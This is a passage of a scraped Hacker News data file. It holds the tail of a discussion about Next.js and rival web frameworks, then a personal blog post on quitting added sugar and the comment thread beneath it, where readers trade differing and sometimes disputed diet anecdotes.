of integrating existing general solution. reply molebury1 8 hours agorootparentprevnext [2 more] [flagged] officialchicken 7 hours agorootparentYes, that's the idea, dudebro! When the market does not meet your needs - you meet the market. reply ulrischa 8 hours agoparentprevI heard Astro is good reply highcenburg 6 hours agoprevFinally, this helped my decision whether to use Nextjs or Reactjs in my projects. reply patwoz 5 hours agoprevJust use remix. It’s so much easier and less painful. reply pjmlp 8 hours agoprevAs long as it keeps being the closest to Spring and ASP.NET on node land, I am ok with where it is going. reply stepbeek 7 hours agoparentI would have thought https://adonisjs.com/ was the equivalent? I've not used next.js for a few years but it doesn't seem to have an answer for anything on the back-end except rendering. That only covers a tiny part of what frameworks like Spring or ASP.NET offer. reply pjmlp 6 hours agorootparentYou use API routes for the backend stuff, the typical controllers, what is now known as Backend For Frontend in marketing speak. reply alexhutcheson 3 hours agoparentprevWhat makes it the closest to Spring and ASP.NET? reply pjmlp 2 hours agorootparentThe mix of React components that can also be rendered server side (JSP tag libraries, Razor View Components), middleware (servlets, middleware), API routes (controllers). reply pictur 7 hours agoprevnext js is one of those projects that unintentionally makes things complicated on purpose. Everything is going very well up to a certain point. but at some point you find yourself in a serverprops hell. reply bryanrasmussen 4 hours agoparenthow does one unintentionally make things complicated on purpose? Next.Js made things complicated unintentionally because they thought that a folder based mapping of routes was good and would evidently scale to their customer base's needs. Then they were so far in that was one of the things they couldn't undo. Oops. reply ulrischa 8 hours agoprevI would like to see a fullstack framework like next for Webcomponents. And one thing is missing for all fullstack frameworks: A CMS. Astro and next is very good but I can not offer markdown or jsx for a client reply terrablue 3 hours agoparentPrimate gets close to that -- there is a webc handler with props support: https://primatejs.com/modules/web-components The webc handler does lack a few things like hydration, and this can be added if users show interest in it. reply cranberryturkey 10 hours agoprevCheckout primatejs if you're tired of all the nonsense. reply bryanrasmussen 4 hours agoparentwell.. sounds nice but some things make me worried: 1. \"Use the comfort of one runtime during development and the speed gains of another in production.\" how is that possible without hitting all sorts of backwards/forwards compatibility issues. 2. The react example you give on the front page does not seem very react-like. - that said \"Write backend code in your language of choice, leveraging the power of Wasm. Mix routes of different backend languages, allowing your application to be written by different teams.\" sounds like something that you might think who the hell needs that, but I've worked on a few teams, and am on one now that could perhaps benefit from it. instead what happens now is there is a JS api that sends requests forwards to the actual backend - maybe doing some minimal verification etc. so doubling work - not all places but certain api end points where we don't want to reveal secrets in frontend etc. reply terrablue 3 hours agorootparentHey. Regarding 1, compatibility is handled by a separate library, Primate's only dependency, rcompat: https://github.com/rcompat/rcompat ; it's a unified compat layer around Node, Deno and Bun. As for 2, what would you consider a React-like example? The examples on the frontend are meant to illustrate commonalities between different frontends. reply lambdaba 8 hours agoparentprevWhy is it great? reply cranberryturkey 7 hours agorootparentIt lets you use any ui framework you want reply moritzwarhier 5 hours agorootparentThen what does it do? Is it similar to Vike.dev? reply cranberryturkey 4 hours agorootparentIt allows you to use vue, react, svelte, angular, htmx, solid, etc....and for the backend you can use Go, python, bun/node/deno and/or typescript. We're also releasing a new version soon that will allow for native desktop apps (ie: Tauri) reply epolanski 6 hours agoprev [–] I think that the industry is very slow into abandoning the React ecosystem (that's a huge statement to React's impact) for saner choices like Vue/Nuxt that have none of the problems of the react ecosystem. At the end of the day, React's weakness will always be it's model of render functions, while nice to reason on, it's close to impossible to pre compilate. That will always make React slower than template, and directives based alternatives, so people need to go into madness to get good performing react applications, and none of this is gonna come out of the box. reply nov21b 5 hours agoparent [–] I switched from Vue/Nuxt 2 to React at the time of the V3 transition. The reason was horrible slow dev performance, lack of template type checking and overall slow transition of the ecosystem to V3. reply GuidelinesFAQListsAPISecurityLegalApply to YCContact Search:",
    "originSummary": [
      "Next.js' new App Router requires deep internal knowledge for basic tasks and has many opt-out pitfalls, making it harder to use compared to its predecessor, the Pages Router.",
      "The Next 13 release introduced features like Server Components, Layouts, and sophisticated caching, which benefit complex applications but add complexity and unexpected behaviors for simpler projects.",
      "Developers should consider whether the App Router’s complexity aligns with their project needs, as simpler tools might be more suitable for certain use cases, despite Next.js recommending the App Router."
    ],
    "commentSummary": [
      "Next.js is facing criticism for a difficult development environment, unstable caching, and limitations in its file-based router.",
      "Developers report issues with combining client and server state, complex authentication setups, and a slow, memory-intensive new app router.",
      "Many are considering alternatives like Remix, SvelteKit, or Vue/Nuxt due to these challenges, with the shift towards server-side rendering and React Server Components adding complexity without clear benefits."
    ],
    "points": 133,
    "commentCount": 140,
    "retryCount": 0,
    "time": 1719648056
  },
  {
    "id": 40829312,
    "title": "How I overcame my addiction to sugar",
    "originLink": "https://josem.co/how-i-overcame-my-addiction-to-sugar/",
    "originBody": "How I overcame my addiction to sugar June 29, 2024 Photo by Suzy Hazelwood I remember my breakfast as a kid. It was as sugary as it gets, with cereal and milk or a good marmalade toast and a chocolate shake to start my day. I remember the highs and lows of my energy levels throughout the day or how I would look in the mirror and wonder why I grew as a chubby kid instead of thinner and stronger like some friends. I had no idea what a good diet looked like, and without any good examples to follow in my environment, I was pretty deep into an addiction that has been hard to defeat in my adulthood. The problem with sugar, apart from being very addictive, is that I used it as a gateway. Later in my adult life, when I felt stressed or overwhelmed, I drank a glass of milk and cookies and watched a movie at night. Somehow, the immediate pleasure of the taste was enough to make me forget about my problems. I felt better, even if it was just for a few minutes. When I didn’t have anything sugary at home to eat, I had to go to the supermarket, sometimes at embarrassingly late hours, to buy some cookies or a sponge cake. At some point in my early twenties, overweight and tired, I accepted I had a problem. I also learned that sugar is very addictive. So, I made a decision—no more added sugar in my diet. I cannot count how many times I’ve succumbed again to the addiction. These episodes, and how long they lasted, were thankfully less frequent and shorter over time, but it wasn’t a straight line from point A to point B. Thankfully, I’m in a much better position after countless drawbacks. I still have some added sugar here and there, like a dessert on a special occasion, but it’s far from my previous daily consumption levels. I’d say there are perhaps three aspects that helped me overcome my addiction. 1. Change of environment In 1971, the public knew that many soldiers in the Vietnam War were addicted to heroin. Authorities run tests to see who was addicted before returning home and then after the first, second, and third years. The results were surprisingly positive. Of all the men addicted in Vietnam, only 12% relapsed to addiction in the three years after returning home—almost 90% of the recovery rate. The main conclusion from the study is that a change of environment as radical as Vietnam’s during a war period compared to the US was critical for their recovery. I used this principle by taking some long vacations in the summer to stop eating sugar. I wasn’t at home and had a different schedule, but I’m sure it made things easier. When I came back, I moved to the second step. 2. Removing the possibility Not having anything sugary around the house made it easier not to take it. Of course, I could still buy it, but it was easier not to do it. When I returned from my trip, my fridge was empty, so I resisted the temptation to buy those products. This was a one-time challenge compared to the ongoing fight I would have endured if I had something at home. 3. Influential habits Like water overflowing a vase and filling other vases around it, some habits have a positive rippling effect on your life. For example, after a good strength session at the gym, I didn’t want to have anything sugary, and overall, I was prone to eat healthier because my body needed more protein and good energy. Or if I drank enough water, I felt full and ate less overall. So, another thing I implemented was a good schedule for visiting the gym regularly, drinking enough water, and living an active lifestyle. I wish this could help someone out there struggling with the same problem. I can see sugar addiction is very common, even though many people don’t even think about it, but it is still bad for you and your freedom. Good luck if you’re struggling with something similar; you’ve got this! Until next time. Subscribe below to get future posts in your inbox (no spam) Or use the RSS feed link. This site is ads-free and done in my free time. Buy Me A Coffee to help me keep working on it.",
    "commentLink": "https://news.ycombinator.com/item?id=40829312",
    "commentBody": "How I overcame my addiction to sugar (josem.co)116 points by josem 8 hours agohidepastfavorite176 comments ralferoo 6 hours ago> When I returned from my trip, my fridge was empty, so I resisted the temptation to buy those products. This has to be my reality. If I buy treats, no matter how good my intentions are to make them last, they just don't survive in the cupboard more than a couple of days. I have to leave my kitchen mostly empty apart from: diet soda, meat, cheese, yoghurt, peanut butter. Everything else is just too addictive and I keep eating it until it's gone. I do have other stuff, but have to buy it as and when I need it in a quantity that will only last one meal. One suggestion I can give if you like chocolate is to buy some 90% or 95% chocolate. It's hard to eat more than one piece at a time without your mouth feeling quite dry, and a 100g bar can easily last a week. After a while, if you have anything else, even 80%, it'll taste really sweet. But it only take a bar or two of the really easy to eat sweet variety before you'll be hooked on it again. reply galangalalgol 6 hours agoparentI tried this and eventually started binging on higher and higher percent chocolate. Eventually I was sitting at work stuffing a handful of crushed toasted Cocoa nibs into my mouth ... I suppose I did end my craving for sweets though. I can't make hard cheeses last more than a couple days either. Leaving the kitchen empty works pretty well for me. But I'll binge on pretty much anything that is left if the hunger hits me. reply tarsinge 1 hour agorootparentBig difference is hard cheese is nutrient dense and leave me without hunger for a far longer time than empty calories simple carbs that basically bypasses the body checks. Lot of times when I am hungry my body just wants protein. 1000kcal of sugars can leave me hungry after one hour. I eat ton of 80% chocolate and hard cheese and don't get any weight. On the other hand with simple carbs and white flour based things (pasta, bread, pastries...) I have to consciously limit myself to a few per weeks otherwise kg starts piling on fast again. reply dcchambers 4 hours agoparentprevOut of sight, out of mind. It's the only thing that works for me. My wife has the ability to have a pantry stocked full of treats and never eat them. I on the other hand have zero willpower in such cases. A pack of oreos will be destroyed in 24 hours, 1 or 2 innocent cookies at a time. Same with chips. These foods just completely break my brain. Yet if I simply don't have those things in the house, I have no cravings for them at all. reply TheCraiggers 5 hours agoparentprevThis used to work for me. I'm also fairly frugal by nature, so it was very easy to just not buy the stuff while grocery shopping. But then I got married, and had offspring. I don't do the majority of the shopping any more, and no longer have absolute control of what enters my pantry. And so now I eat everything. reply stranded22 5 hours agoparentprevLast a week? Amateur - I can munch through 100% chocolate quite easily (Montezuma Orange is my favourite for UK people - buy in Sainsburys) reply grecy 5 hours agoparentprevMuch alike a recovering alcoholic, it's easier just not to go into a bar. I do exactly the same thing by not having a phone. I know I would be that guy always looking at it instead of engaging with the real world. So I just don't have one. It's better that way. reply doubled112 5 hours agorootparentSometimes I consider dumping the phone in a drawer. While I haven't quit cold turkey, I've found life much much more peaceful since I uninstalled most of the apps on my phone. Email, chat, maps, and music. I think I left notes and a password manager. Now it isn't trying to get my attention all the time. Even disabling notifications would have helped. A couple of my friends and I host our own Matrix homeservers, so even that is pretty quiet. reply cubefox 7 hours agoprevQuitting cold turkey after a change of environment (moving somewhere else) is a good tip not just for addiction, but for any change in habit. However, a more practical approach is to reduce the dosage slowly. That works especially well for sweet drinks. If you have a soda maker, you can slowly reduce the amount of syrup you use. After a while, your tolerance for sweetness goes down, so things that previously felt not sweet enough feel just right, and things that felt just right before will now feel overly sweet. This will then also help with reducing sweet food. reply will1am 6 hours agoparentGradual reduction is often more sustainable and manageable for most people. But for me that didn't work when I first started. reply TaylorAlexander 5 hours agoparentprevI go for very low sweetness drinks too. I don’t have a soda maker but I buy cans of plain sparkling water and add a dash of store bought kombucha to the can. Usually I take one sip off a fresh can and then pour in a little kombucha. You can buy flavored sparkling water but the flavorings they tend to use don’t sit well with my stomach. The right flavor of kombucha does the trick for me nicely though. I would feel sick if I ever tried to drink a Coca-Cola. It’s incredible how much sugar they put in those things. reply cubefox 4 hours agorootparentAnother possibility is to add a dash of lemon juice. reply cassianoleal 4 hours agoparentprevI found that kombucha is an excellent, really low-calorie alternative to sugary drinks. Actually, to sugar in general. I have a sweet tooth and I have difficulty managing it some times. Kombucha is filling and most times one can is enough to make the cravings stop completely. I suspect it's a combination of the slightly sweet taste with the good gut bacteria. reply amanaplanacanal 5 hours agoparentprevCold Turkey has always worked best for me. Quitting smoking by gradual reduction just never seemed practical. If it works for others, more power to them! reply 2Gkashmiri 6 hours agoparentprevi stopped drinking soft drinks out of spite for my siblings. now they taunt me but i dont feel any urge to drink regardless of how it takes. for me it tastes like sugar water reply 01HNNWZ0MV43FF 5 hours agorootparentI love sugar water. On my new ADHD meds I finally managed to kick soda for a few weeks, but I think I'll limit myself to one can a week on Saturdays because I miss the feeling. It's the only drug I do and all my friends are stoners, so.. reply hombre_fatal 5 hours agorootparentWhy not just a sugar-free option like Coke Zero? reply 01HNNWZ0MV43FF 3 hours agorootparentThe sugar-free sweeteners taste odd to me, I haven't found one I like reply hamasho 6 hours agoprevWhat I learned from my weight loss journey is that good sleep does wonders for my brain. It helps me remember my long-term goals and resist those pesky urges for sugary, fatty snacks. Plus, when I'm well-rested, my brain seems to actually register when my stomach isn't empty, so it doesn't send out those annoying craving signals. And after all that health talk, I'll probably still end up scrolling through Reddit for a couple of hours before bed. reply lazylion2 13 minutes agoparentOne thing that I think helps is to set reddit on text only by searching for self:true. less stimulating reply FooBarBizBazz 4 hours agoparentprev> And after all that health talk, I'll probably still end up scrolling through Reddit for a couple of hours before bed. Going for a long walk, especially in an interesting/stimulating place like a pleasant city, does something similar for my brain. It entertains in a general, unchallenging way. Instead of scrolling Reddit past your thumb, you scroll the world past yourself. It's not like going for a run where you have to get over a wall; it's easy to just lapse into by default, especially if you put yourself into a walkable environment. Plus, after you've gone about three miles, your body just goes on autopilot and you just sort of naturally keep moving. It barely counts as exercise, but it will do something for your lower back, and it does burn about 100 kcal per mile, which if you keep it up all day will add up. So, I can heartily endorse, for the person who scrolls a representation of the world past their nose, to instead translate their body through the world. reply k__ 7 hours agoprevIt's nefarious! Especially if you have a dopamin deficiency (ADHD, etc.) and you eat so you aren't bored. I can eat 500g of m&ms in one sitting, no problem, and I'm not even overweight or something. reply Galatians4_16 6 hours agoparentSwitch to nuts, but be sure to pair with citrus, to offset the oxalates, or you'll get kidney stones. Food cravings often reflect mineral cravings (1) 1. https://dailyhealthpost.com/wp-content/uploads/2016/02/21-fo... reply Bognar 5 hours agorootparentThat image looks like unscientific nonsense. Craving sugar means I need carbon? Carbon is the building block of every organic chemical, and elemental carbon has very little use in the body. It's near meaningless to say you need carbon. The answer is fortunately simpler, craving sugar probably means your blood sugar is low, or that it crashed after a spike. Counterintuitively, people can avoid this by eating things with less sugar overall or with complex sugars. Requiring the body to break complex sugars down into simple sugars takes time, which keeps your blood sugar from spiking too high. reply coldtea 5 hours agorootparentprev>Switch to nuts Nut are crazily high in calories though. Walnuts are 650 calories per 100 grams (and 100 grams are not that difficult to eat!). 100 grams of steak are like 270 calories for comparison (less than half!). reply TaylorAlexander 5 hours agorootparentIsn’t that the point? Your body needs calories! Nuts are a great way to get filling healthy calories so you don’t go around eating junk. M&M’s are 492 calories per 100g, so slightly less than your figure for walnuts, but I can’t imagine that eating candy is healthier. And similarly, steak has many negative health effects. reply hollywood_court 3 hours agorootparentWhat are the many negative health effects of steak? I eat a ~1lb pan fried strip steak with steamed broccoli for breakfast 7 days per week. It’s the easiest and most consistent way to help me meet my protein and fiber goals. My GP does my bloodwork twice per year and the only thing he has ever told me is that I need to take a Vitamin D supplement. But he also said that he tells all of his patients that. reply giantg2 4 hours agorootparentprev\"steak has many negative health effects.\" Many? There are some, but I wouldn't say many if consumed in moderation, and maybe depending on what animal (elk, deer, vs cow) and how it was raised (grass fed). Most of the negatives are associated with red meat are focusing on saturated fat or on processed red meat. The other type of study is usually looking at groups who have other potential lifestyle factors that might affect the other issues (like diabetes). reply funkydata 7 hours agoparentprevSame here, m&m's are nefarious indeed. reply will1am 6 hours agorootparentI think M&M's particularly tricky to cut down reply alamortsubite 6 hours agorootparentCut them with peanuts and raisins. reply inSenCite 6 hours agoprevEveryone's struggle with addiction is different. I'm glad this person found a good way for them and I'm sure it might help others as well. Don't be discouraged if it doesn't always work for you, maybe you just need to try a different approach. reply coldtea 5 hours agoparent>Everyone's struggle with addiction is different Not that different, since people still share billions of years of evolutionary mechanisms, and thousands of years of social conditioning. At best there are a few different kinds of struggle with addiction. reply illiac786 2 hours agorootparentDepends on your referential. Within humanity, addiction takes very different form. Compared to mosquitos, our addictions are probably still very similar, yes. I think I fail to see your point though. Are you saying people tend to exaggerate how different addictions are, for example to better sell some new addiction overcoming books or courses? reply ThinkBeat 7 hours agoprevTo compare it to heroin is a horrible trivialization of something that destroys a person and at time those around the person. I feel that to make this statement in any genuine way, the author should spend 6 months developing a serious addiction to heroin then attempt to get clean. I am blessed I have never done heroin and hopefully I never will. I have gone weeks without sugar and had a craving, some mild headaches and at times been a bit grumpier. That is not even a measurable fraction of trying to get sober from a heroin addiction. reply wanderingstan 7 hours agoparentThe author did not imply that sugar addiction is anywhere as bad as heroin addiction. They observed a technique that was shown scientifically to be effective for the more serious addiction and decided to try it for their milder addiction. That’s just good reasoning, and it worked for them. > The main conclusion from the study is that a change of environment as radical as Vietnam’s during a war period compared to the US was critical for their recovery. reply claar 26 minutes agoparentprevYou're wrong, actually, based on my conversations with my friends who are sober through Narcotics Anonymous. Intuition may tell you that \"softer\" addictions like sugar/food, video games/tech, pornography/sex, etc. are easier to stop than narcotics, but reality doesn't bear this out from those I've spoken with, at least if you have a true DSM-5 criteria addiction to these \"softer\" substances (which if you have a true addiction, can readily destroy your life and even kill you). The trivial availability, legality, lack of social stigma/shame and other factors cause such addictions to actually be much more challenging to become sober from than narcotics or alcohol, on average. That said, my sample size is quite small and skewed, since those I've talked to have achieved long-term NA/AA sobriety for the most part. reply hollywood_court 6 hours agoparentprevObesity related deaths are the second leading cause of preventable deaths in the US. Sugar addiction can lead to obesity. And obesity can absolutely affect the lives of others around you. I’ve mentioned here before how I’m the only person in my immediate family who isn’t obese. Growing up with obese family members can affect your lifestyle greatly. It’s not fun. reply epolanski 6 hours agoparentprevDon't get why you get into such criticism, the author did not compare sugar to heroin, he made an example of something indeed more dangerous and even more addicting that had a great benefit from the change of environment and stated he worked for him too. reply savanaly 7 hours agoparentprevThere are other axes of comparison than severity. I think it’s a comparison that well illustrates their point. reply rchaud 5 hours agorootparentIt's a blog post, not a feature article in a national newspaper. reply Spooky23 6 hours agoparentprevPeople’s experiences vary. If you want to understand through experience, try a GLP-1 drug. It changes your relationship with rewards, from alcohol to sugar to sex. reply graypegg 7 hours agoparentprevI’m glad I’m not the only one that feels off about that. I feel like heroin as the standard measure of “really bad addiction” is at least an unhelpful choice. I don’t think people walk away from an article like this thinking opiate addiction is any less horrible than they originally thought, but the usual refrain of “[porn|sugar|social media] is like heroin!” usually presented with a fMRI capture with circles on it, gives me pause. At best, it’s not communicating the actual effect of addiction on someone’s life, at worst it does trivialize it. To be fair to the author, this article doesn’t follow that usual refrain. reply prmoustache 6 hours agoparentprevAddiction is addiction regardless of the product or its side effects on your life. That is what is important here. reply faramarz 7 hours agoprevA decade ago I got into intermitted fasting and forced myself to drink my coffee black at work. Going from a double-double (x2 cream, x2 sugar) at timmies to black. big change but the IF motivation for mental clarity, and increasing my metabolism worked out so well that I didn't mess with the regiment until recently adding oat milk to my coffee, or butter. its really about dealing down the dark coffee flavour. beyond the benefits, I find that my palette rejects anything too sweet now. my wife's family loves mangoes and its one of the first things they eat in the morning. I just can't. grapes, mangoes, lychee.. all way too sweet for my liking. if it comes to sweetening a summer lemonade for guests, real maple syrup over sugar and it really helps when your circle of friends are also on a similar kick. no one brings donuts to gatherings any more. reply throwaway7ahgb 5 hours agoparentOne little tip for people trying to move to black coffee from milk and/or sugar: Try to find a good light roast, not dark or medium. Light roasts are usually less bitter which is why milk is sometimes added to cut the bitterness. Coffee preferences are very subjective, this is what worked for me, YMMMV. reply alargemoose 5 hours agorootparentOn the same note, also try Cold brewed coffee, it has lower acidity than hot brewed coffee. reply Dolores12 5 hours agoparentprevAfter not eating sweet food for some time, i noticed usual food like milk becomes sweet. And mango is just not palatable. Too much sugar, for no benefit. reply tupolef 4 hours agoprevSince I was a teenager, a mild but persistent acne has plagued my daily life. Up until the age of 30, I always believed that only medications, impeccable hygiene and weekly physical activity could help reduce the effects. Then, after a complete change of diet due to my move to Asia, I realized that the main factor was sugar. By going completely sugar-free in my diet, I no longer have acne at all as long as I keep away from it. It really got me thinking that most people should explore how their bodies work, without necessarily relying on what works for others or what modern medicine advises, and also that severe fasting is a good way to start the comparison. reply nazgulnarsil 1 hour agoprevOne of the most helpful things for me was eating more fruit, particularly citrus. I believe the sugar craving may be a disguised vitamin c craving. reply alamortsubite 7 hours agoprevMy girlfriend works at a hospital, where ironically there's always a steady supply of sugary treats on hand. It's a crutch as they're constantly dealing with truly unpleasant situations, but ultimately very unhealthy. I wish they had something to kick them out of the cycle. Years ago, I pitched the idea of armbands for staff that pledged abstinence. It fell flat. I don't have a problem with sugar but probably only thanks to my weird environment and being extremely active. reply vlad_ungureanu 6 hours agoprevAll the tips given in the article are very useful, but for me it was also useful learning how to make different types of jam or cakes helps you understand the amount of sugar and butter used. Replacing store-bought sweets with homemade options gives you a sense of appreciation and a 'ritualistic' aspect when enjoying something sweet, which may reduce how often you indulge in sugary treats. reply woolion 5 hours agoprevWhen I'm working on the computer late, eating chocolate or other sweet things was a real crutch. Not doing it required a lot of willpower, so I could sometimes limit my consumption for some periods, but I gave up on quitting sugar in the long run. For other health-related reasons (migraines) I went keto since a few months ago and had no problems at all quitting sugar altogether. Nuts, cured ham are great for occasional nibbling. My sweet thing is a 'keto cream' with a blend of cream and yogurt whipped to be fluffy and topped with peanut butter and crushed nuts. I do have some very occasional cravings for fries or chocolate, but it is very very rare, almost nothing compared to a normal high-carb diet. (I break the ketosis for a carbful meal from time to time, so it's not like alcoholism where seeing carbs or sugar is a problem that would cause a relapse either.) reply coldtea 5 hours agoparent>eating chocolate or other sweet things was a real crutch. Not doing it required a lot of willpower Not buying them and not having them around the house though, requires much less, and helps when it's late at the computer and you crave some! reply switch007 7 hours agoprevI cut out sugar for a month recently and my sleep cut in half and my depression really worsened. Really affected my job performance. I didn't think it would last that long or be that bad. It's crazy. I went back to eating bit of sugar and the same night had a great sleep. Not sure what to do now. I find it easy not to eat it but the side effects are very difficult to deal with reply epolanski 6 hours agoparentI think your body and brain have simply to adapt. Experiment with gradually more sugar till you find a right balance then get back to cutting in very small steps. reply switch007 6 hours agorootparentYou may be right. I inadvertently went cold turkey as I was counting calories and sugar is high in calories and substituting for meat/veg was easy. reply will1am 6 hours agoparentprevCutting out sugar entirely is too challenging reply TylerLives 6 hours agoparentprevThis will probably get a lot of downvotes, but consider the possibility that sugar is actually good for you - https://raypeat.com/articles/articles/glycemia.shtml reply louthy 5 hours agoprevAs a sugar addict the only thing that has ever worked for me was doing a 3 day fast. For about 6 months afterwards I just seemed to not need sugary things as much and I didn’t crave it in the same way. I also had a lot more control over my hunger, being able to ignore it for longer, so I guess that probably helped. Eventually it wore off and I was back to being an addict again, but I thought it was interesting because I never expected that to happen. I guess it was a ‘cold turkey’ episode. reply itscrush 5 hours agoparentDid you return to try another 3-day fast? Any ability to repeat the prior success? reply louthy 4 hours agorootparentI haven’t yet, but I’m feeling like I need to again! reply nunez 3 hours agoprevThere are skinny folks who had the exact same diet growing up. It's luck of the draw. reply zug_zug 7 hours agoprevI'm not sure I believed in sugar as an addiction at first. Then I tried this keto diet because I had seen my friend try it and he lost a lot of weight. And then I had this phenomenon that was so strong that I still remember it years later - I started having fantasies about soda/milkshakes in the middle of a workday. Like so intense/ongoing that the only thing I can compare them to is a teen's sexual fantasies. Mind you I wasn't even somebody who drank soda every day or week. I found some voice in the back of my head saying \"We could literally go get a cherry coke in under 4 minutes, there's a CVS around the corner, or a root beer? Or a root beer float? Dr pepper? We could get two.\" I ended up drinking diet soda for a few weeks (which I normally find disgusting). Anyways after a certain point (3 months?) the cravings died and never came back the same way. Your mileage may vary. reply jiggawatts 7 hours agoparentSeveral others have mentioned that after cutting back on sugar, many foods taste overly sweet, but they're probably still eating way more than you do when you're on Keto. When I stopped Keto, entire categories of food become intolerably sweet. It was at least a year or two before I could eat a burger. They're basically a meat cake! reply ralferoo 6 hours agorootparentMcDonalds is actually OK for Keto. The restaurant is built on the principle of trying to trick you to have carbs so you still feel hungry and buy more, but actually the meat on its own isn't terrible. A couple of double cheeseburgers without buns in a stack makes a good meal. If you're really after the burger feeling, get two mayo chicken burgers without mayo or buns and use the lightly battered chicken burger as your \"bread\" and in the middle have a double cheeseburger without buns. Fortunately this combo doesn't have the nickname in the UK as it does in the US, but I'm always a little self-conscious when I'm eating it, just in case anyone around does know and what they might think of me! Also, in the UK at least, 3 items from the saver menu costs roughly the same as a normal meal deal, is much more filling and obviously keto friendly. reply throwaway7ahgb 5 hours agorootparentMcD double cheeseburger is one of the best protein/$ available in fast food. (depends on market) reply kzrdude 7 hours agoprevReplacement works for me. Replaced all added sugars stuff (drinks, ice cream, cookies) with fruit and the difference was very noticeable. Fruit also has its own kind of sugar, but my body runs differently on that compared with food with added sugar. reply nirav72 5 hours agoparentI use a GCM and one thing I've noticed about fruits in general is that the glucose spike is short. Things level off on the graph fairly quickly with berries. Although there are some fruits that do cause a significant spike. Fruits like grapes, pineapple and bananas are the worst ones. reply TaylorAlexander 4 hours agorootparentYes generally, whole fruits are considered healthy in any quantity from what research I’ve heard about. https://youtu.be/bHnsawfk43Y reply sedatk 6 hours agoparentprevFructose (the sugar that comes from fruits) is more harmful than glucose though. reply Dolores12 5 hours agorootparentWith every fruit you get healthy dose of fiber that helps digestive system to push residuals out. 3 bananas that will make you full equals 2 cans of 330ml cola and i bet you still will want to eat after that. reply gnz11 6 hours agorootparentprevCome on, are you seriously implying fruit is somehow bad for you now? reply lambdaone 6 hours agorootparentThe parent poster is right in that pure fructose is probably worse for you than an equivalent amount of pure sucrose. But the way that fructose is delivered to your body by digesting fruit - slowly, and in conjuction with other materials, in a way that we have evolved to tolerate - is entirely different from eating the pure chemical. reply gnz11 6 hours agorootparentThe amount of fruit you’d have to consume to ingest unhealthy levels of fructose is astronomical. Worrying about whether fruit is unhealthy is most likely causing you more harm than the fructose in fruit. Don’t worry about eating fruit. reply coldtea 5 hours agorootparent>The amount of fruit you’d have to consume to ingest unhealthy levels of fructose is astronomical. What's \"unhealthy\" here? LD50? reply jakubmazanec 5 hours agorootparentprevThis is some latest research on this topic: https://www.ncbi.nlm.nih.gov/pmc/articles/PMC10363705/ reply duckmysick 5 hours agorootparentWhat exactly do you mean by \"this topic\"? Fruits being bad for you, which is the comment you're replying to? This is the only mention of fruit in the linked paper: > Fructose is a simple sugar that is the primary nutrient in fruit and honey. However, in the western diet, its main source is table sugar (sucrose), which consists of fructose and glucose bound together, and high fructose corn syrup (HFCS), which consists of a blended mixture of fructose and glucose, often with slightly higher concentrations of fructose as testing has suggested humans prefer slightly more fructose as it is sweeter than glucose. Today these ‘added sugars’ account for ≈15% of overall energy intake, with some groups ingesting as much as 20% or more. > Fructose is also generated in the body from glucose. This occurs when glucose levels (i.e. the substrate) are excessive, such as in diabetes, following the ingestion of high glycaemic carbohydrates, and by high carbohydrate diets. Similarly, the grandparent comment \"Fructose (the sugar that comes from fruits)\" should read like this: \"Fructose (the sugar that comes from fruits, but these days it's primarily from table sugar and processed foods)\" reply jakubmazanec 2 hours agorootparentYes, thank you; I was in a hurry and didn't write the best comment with the full context. reply hombre_fatal 4 hours agorootparentprevThis doesn't answer the question. The question is if fruit are associated with negative health outcomes in a human population. What you're doing is saying inflammation is bad and then inferring that exercise is bad because it increases inflammation. reply coldtea 5 hours agorootparentprevNot implying, it's a settled thing. The ocassional fruit is ok, but fructose is bad, and smoothies are basically sugar bombs. reply TaylorAlexander 4 hours agorootparentThis is the opposite of the research-backed claims on whole fruits from this video: https://youtu.be/bHnsawfk43Y reply will1am 6 hours agoparentprevAs soon as I stopped eating sugar, I started craving fruits intensely. My body began demanding compensation. reply coldtea 5 hours agorootparentAnd eating fruits it's almost equally bad sugar wise, especially drinking them in smoothies and such. reply TaylorAlexander 4 hours agorootparentGenerally, whole fruits are considered to have positive health effects, even in studies of patients with diabetes, at nearly any quantities. https://youtu.be/bHnsawfk43Y reply hombre_fatal 5 hours agorootparentprevNonsense. Fruit has fiber and all sorts of nutrient benefits. Even your smoothie claim is false: https://www.stylist.co.uk/fitness-health/nutrition/smoothies... reply ImHereToVote 7 hours agoparentprevPart of the sweetness in berries comes from other sweet compounds like Glycine for example. reply will1am 6 hours agorootparentBerries are my salvation. reply mateuszbuda 5 hours agoprevI tried not buying food with added sugar but it’s surprisingly difficult. Here is an interesting analysis I did some time ago which shows that for half of the food items, sugar is the main ingredient: https://scrapingfish.com/blog/scraping-walmart reply dataviz1000 7 hours agoprevI was in Florida. The nitrogen runoff created an algae bloom that suffocated thousands of fish and manatees. As a joke at the hipster coffee shop I picked up a packet of sugar and said I was boycotting sugar because what the big sugar did to the environment. I didn’t make any difference except I’ve had perfect blood work and zero cavities since. I also lost a lot of weight. Maybe I didn’t make the environment healthy however I sure am a lot healthier. reply penguin_booze 4 hours agoprevBefore I go shopping, I drink a full glass of water. This has helped suppress or avoid the urge to making impulse purchases at the supermarket. Almost always I regret having bought them; and almost always, I eat them because I don't want to throw them out. reply bdcravens 5 hours agoprevSugar is one of my downfalls, but unfortunately I have to keep some sugar around for when I have a blood glucose low (I'm diabetic and have a pump). Of course, I could focus on more healthy versions of sugar (like juice instead of candy), which I almost never do. reply nradov 5 hours agoparentFruit juice is basically liquid candy. For most people there's nothing wrong with drinking a little bit but the effects on blood sugar are similar to eating candy. (This is not medical advice for diabetics.) reply j_m_b 6 hours agoprevI started a strict Keton diet back in April. I started by doing a 48 hour fast to completely eliminate stored glycogen stores. I also began with intermittent fasting by skipping breakfast. It was hard at first, but thankfully I never experienced the \"keto flu\" that some people do. I wonder if the initial fasting helped with that. reply snvzz 5 hours agoprevVery long article, for something so simple. Stop eating i.e. fast. The cravings go away within 48h. Done, solved. reply nomius10 4 hours agoparentAs the article stated, sugar consumption was a method of coping (when he felt stressed or overwhelmed). If you consider that the source of that stress is chronic or from something constantly being put away, then that repeated regular use over the course of decades becomes quite a tough pattern to break, since it represents a fundamental element of what keeps you sane. In these cases, the sudden removal is comparable to living a nightmare. So I beg to differ that it's not (always) that simple. reply snvzz 2 hours agorootparentIt's also about the only option. Got to stop consumption. So what would you advocate, involuntary commitment perhaps? reply coldtea 5 hours agoparentprevThis is like: - You're depressed? Just cheer up! - Gee, why haven't I thought of that! Fasting wont take away the cravings, if anything it will make them worse (after a few days you feel very hungry and all you can think about is food, then there's a period where you don't mind, then you are starving again, and so on). And even if it did, once you stop the fast you get the cravings again. reply snvzz 5 